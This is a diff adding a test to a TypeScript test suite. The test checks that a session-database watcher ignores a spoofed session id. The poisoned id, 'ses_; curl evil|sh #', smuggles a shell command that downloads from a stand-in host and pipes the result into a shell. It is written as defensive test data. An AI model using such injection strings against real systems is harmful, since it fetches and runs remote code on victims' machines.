@@ -216,4 +216,37 @@ describe("OpencodeStorageWatcher — live detection + working->complete flip", (
     clearPosition(dbPath);
     fs.rmSync(dbPath, { force: true });
   });
+
+  // Ingest-boundary RCE guard (security critic): opencode's session.id column is
+  // externally writable (any process can INSERT). A spoofed row whose id merely starts
+  // with "ses_" but carries shell syntax must NOT be emitted — it would become the
+  // convex session_id and later an unescaped resume command. Only the real ses_<base62>
+  // shape is tracked. SYNTHETIC rows.
+  test("skips a spoofed ses_ id carrying shell syntax; tracks only the well-formed one", async () => {
+    const dbPath = tmpDbPath();
+    const db = new Database(dbPath);
+    createSchema(db);
+    const good = "ses_08f9926d3ffelzGS3Q3CteaeUk";
+    const poison = "ses_; curl evil|sh #";
+    for (const id of [good, poison]) {
+      db.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
+        .run(id, "/tmp/x", "t", 2000, 2000);
+    }
+    db.close();
+
+    const emitted: string[] = [];
+    const watcher = new OpencodeStorageWatcher(dbPath, 50);
+    watcher.on("session", (e) => emitted.push(e.sessionId));
+    const sawGood = waitForSession(watcher, (e) => e.sessionId === good);
+    watcher.start();
+    await sawGood;
+    await new Promise((r) => setTimeout(r, 150)); // give a stray poison emit a chance
+
+    expect(emitted).toContain(good);
+    expect(emitted).not.toContain(poison);
+
+    watcher.stop();
+    clearPosition(dbPath);
+    fs.rmSync(dbPath, { force: true });
+  });
 });
